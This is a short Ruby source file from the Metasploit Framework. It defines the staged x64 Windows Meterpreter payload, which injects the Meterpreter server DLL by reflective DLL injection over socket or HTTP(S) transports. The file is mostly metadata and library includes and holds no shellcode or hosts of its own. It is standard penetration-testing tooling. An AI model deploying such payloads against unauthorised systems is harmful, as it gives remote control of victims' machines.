##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


###
#
# Injects the x64 meterpreter server DLL via the Reflective Dll Injection payload
# along with transport related configuration.
#
###

module MetasploitModule

  include Msf::Payload::Windows::MeterpreterLoader_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Meterpreter (Reflective Injection x64)',
      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer',
      'Author'        => ['skape', 'sf', 'OJ Reeves'],
      'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi http https'},
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x64_Win))
  end
end
